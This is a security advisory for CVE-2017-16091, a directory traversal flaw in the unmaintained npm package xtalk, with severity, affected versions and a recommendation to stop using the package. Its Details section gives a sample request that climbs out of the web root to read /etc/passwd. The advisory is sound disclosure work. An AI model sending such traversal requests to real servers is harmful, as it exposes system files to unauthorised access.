# [H] Directory Traversal in xtalk

## Summary
Severity: High
Advisory: GHSA-cqv6-7fwc-8m3c
CVE: CVE-2017-16091
CWE: CWE-22
Ecosystem: npm
CVSS: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2020-09-01
Source: https://github.com/advisories/GHSA-cqv6-7fwc-8m3c
Type: github-advisory

## Affected
- npm: `xtalk` — affected >=0.0.2

## Details
Affected versions of `xtalk` are vulnerable to directory traversal, allowing access to the filesystem by placing "../" in the URL.

**Example request:**
```http
GET /../../../../../../../../../../etc/passwd HTTP/1.1
host:localhost
```




## Recommendation

No patch is currently available for this vulnerability, and the package has not been updated since 2014.

The best mitigation is currently to avoid using this package, and using a different, functionally equivalent package.

## References
- https://nvd.nist.gov/vuln/detail/CVE-2017-16091
- https://www.npmjs.com/advisories/339
